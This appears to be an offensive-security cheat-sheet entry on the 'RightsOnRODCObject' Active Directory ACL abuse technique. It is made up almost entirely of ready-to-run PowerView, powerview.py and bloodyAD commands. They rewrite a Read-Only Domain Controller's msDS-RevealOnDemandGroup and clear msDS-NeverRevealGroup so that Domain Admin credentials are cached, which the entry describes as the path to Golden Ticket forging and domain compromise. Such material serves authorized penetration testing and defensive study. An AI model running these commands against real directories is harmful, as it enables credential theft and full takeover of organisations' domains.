---
technique: RightsOnRODCObject
category: acl-abuse
ace: GenericAll, GenericWrite, WriteDacl, WriteOwner, WriteProperty
targets: Computer (RODC)
protocols: LDAP
remote_capable: true
tags: acl-abuse dacl ad rodc tier-zero ldap domain-compromise
---

# RightsOnRODCObject

When a controlled object holds write-capable ACEs over an RODC (Read-Only Domain Controller) computer object, the attacker can manipulate the `msDS-RevealOnDemandGroup` and `msDS-NeverRevealGroup` attributes to force a Domain Admin account's credentials to be cached on the RODC. With administrative access to the RODC host, the attacker can then extract the `krbtgt_XXXXX` key and use it to forge a RODC Golden Ticket, enabling a Key List attack to recover the Domain Administrator's NT hash and fully compromise the domain.

## Required ACEs

| ACE | What it grants |
|-----|----------------|
| GenericAll | Full control, implicitly includes WriteProperty on all attributes |
| GenericWrite | Write to non-protected attributes, including the RODC group lists |
| WriteDacl | Modify the DACL to obtain arbitrary permissions |
| WriteOwner | Take ownership, then use implicit WriteDacl to obtain other permissions |
| WriteProperty (msDS-RevealOnDemandGroup) | Write access to the allowed replication group list |

## Windows

PowerView is the primary tool for modifying RODC group membership attributes.

### Step 1: Set msDS-RevealOnDemandGroup (PowerView)

#powershell #powerview

Set the msDS-RevealOnDemandGroup attribute on the RODC computer object to allow a Domain Admin's credentials to be cached using PowerView.

```powershell title:"Set msDS-RevealOnDemandGroup on RODC via PowerView"
Set-DomainObject -Identity "$rodc_computer" -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,$domain_dn', 'CN=Administrator,CN=Users,$domain_dn')}
```
<!-- cheat
var rodc_computer
var domain_dn
-->

### Step 2: Clear msDS-NeverRevealGroup (PowerView)

#powershell #powerview

Clear the msDS-NeverRevealGroup attribute on the RODC computer object to remove any blocks on credential caching using PowerView.

```powershell title:"Clear msDS-NeverRevealGroup on RODC via PowerView"
Set-DomainObject -Identity "$rodc_computer" -Clear 'msDS-NeverRevealGroup'
```
<!-- cheat
var rodc_computer
-->

## Linux

The powerview.py Python package provides PowerView-compatible commands against the RODC object over LDAP.

### Connect to powerview.py session

#ldap #password #python

Connect to the target RODC using the Python powerview.py package to begin modifying RODC reveal group attributes.

```sh title:"Connect to RODC via powerview.py"
powerview "$domain"/"$user":"$pass"@"$rodc_fqdn"
```
<!-- cheat
import domain_ip
import users
import passwords
var rodc_fqdn
-->

### Step 1: Set msDS-RevealOnDemandGroup (powerview.py)

#ldap #password #python

Set the msDS-RevealOnDemandGroup attribute inside a powerview.py session to allow Domain Admin credential caching on the RODC.

```powershell title:"Set msDS-RevealOnDemandGroup in powerview.py session"
Set-DomainObject -Identity RODC-server$ -Set msDS-RevealOnDemandGroup='CN=Administrator,CN=Users,$domain_dn'
```
<!-- cheat
var domain_dn
-->

### Step 2: Append built-in Allowed RODC group (powerview.py)

#ldap #password #python

Append the built-in Allowed RODC Password Replication Group to msDS-RevealOnDemandGroup inside a powerview.py session.

```powershell title:"Append Allowed RODC Password Replication Group in powerview.py session"
Set-DomainObject -Identity RODC-server$ -Append msDS-RevealOnDemandGroup='CN=Allowed RODC Password Replication Group,CN=Users,$domain_dn'
```
<!-- cheat
var domain_dn
-->

### Step 3: Clear msDS-NeverRevealGroup (powerview.py)

#ldap #password #python

Clear the msDS-NeverRevealGroup attribute inside a powerview.py session to remove blocks on credential replication.

```powershell title:"Clear msDS-NeverRevealGroup in powerview.py session"
Set-DomainObject -Identity RODC-server$ -Clear msDS-NeverRevealGroup
```
<!-- cheat -->

### Step 1: Read msDS-RevealOnDemandGroup (bloodyAD)

#ldap #multi-auth

Read the current msDS-RevealOnDemandGroup attribute value from the RODC computer object using bloodyAD.

```sh title:"Read msDS-RevealOnDemandGroup from RODC via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags get object "$rodc_computer" --attr msDS-RevealOnDemandGroup
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var rodc_computer
-->

### Step 2: Set msDS-RevealOnDemandGroup (bloodyAD)

#ldap #multi-auth

Overwrite the msDS-RevealOnDemandGroup attribute on the RODC computer object using bloodyAD to enable Domain Admin credential replication.

```sh title:"Set msDS-RevealOnDemandGroup on RODC via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags set object "$rodc_computer" --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,$domain_dn' -v 'CN=Administrator,CN=Users,$domain_dn'
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var rodc_computer
var domain_dn
-->

### Step 3: Clear msDS-NeverRevealGroup (bloodyAD)

#ldap #multi-auth

Clear the msDS-NeverRevealGroup attribute on the RODC computer object using bloodyAD to remove any blocks on admin credential caching.

```sh title:"Clear msDS-NeverRevealGroup on RODC via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags set object "$rodc_computer" --attr msDS-NeverRevealGroup
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var rodc_computer
-->
